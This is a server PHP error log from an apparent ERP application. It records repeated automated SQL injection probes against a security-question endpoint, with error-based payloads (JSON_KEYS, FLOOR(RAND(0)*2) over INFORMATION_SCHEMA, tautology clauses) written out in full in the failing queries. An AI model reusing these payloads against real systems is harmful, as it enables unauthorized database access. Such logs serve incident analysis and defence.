[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("") OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,1))),0x71626b7871)) USING utf8))) AND ("TlUn"="TlUn","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("")) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,1))),0x71626b7871)) USING utf8))) AND (("fekk"="fekk","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=804' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques(""))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,1))),0x71626b7871)) USING utf8))) AND ((("lSJk"="lSJk","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=80' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("") OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,1))),0x71626b7871)) USING utf8))) AND ("SlkT" LIKE "SlkT","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("")) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,1))),0x71626b7871)) USING utf8))) AND (("jJoK" LIKE "jJoK","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=804' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques(""))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,1))),0x71626b7871)) USING utf8))) AND ((("whRn" LIKE "whRn","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=80' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:49 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:50 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:50 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("") WHERE 6858=6858 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,1))),0x71626b7871)) USING utf8)))-- ezqM","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 6858=6858 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("" WHERE 7968=7968 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,1))),0x71626b7871)) USING utf8)))-- iFiu","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 7968=7968 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:51 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("")) AS oscn WHERE 8349=8349 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,1))),0x71626b7871)) USING utf8)))-- keBz","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS oscn WHERE 8349=8349 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b62' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("") AS sTmW WHERE 1967=1967 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271,(SELECT (ELT(8043=8043,1))),0x71626b7871)) USING utf8)))-- QMYJ","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AS sTmW WHERE 1967=1967 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6b6271' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("" AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- LtFH","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:52 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("") AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ("OjZE"="OjZE","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("")) AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (("PAbz"="PAbz","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=60' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques(""))) AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((("sCgO"="sCgO","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("") AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ("CazN" LIKE "CazN","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("")) AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (("TByq" LIKE "TByq","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=60' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques(""))) AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((("gHIW" LIKE "gHIW","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:53 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:54 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:54 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:54 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:54 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:54 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("") WHERE 1382=1382 AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FOMd","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 1382=1382 AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELEC' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getSecurity.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[06-Jan-2023 17:51:54 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:54 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:54 Asia/Kolkata] PHP Notice:  Undefined index: dob in /var/www/html/erpm/Controller/getSecurity.php on line 7
[06-Jan-2023 17:51:54 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call get_secques("" WHERE 9674=9674 AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(6003=6003,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TrjN","")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 9674=9674 AND (SELECT 6003 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELEC' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
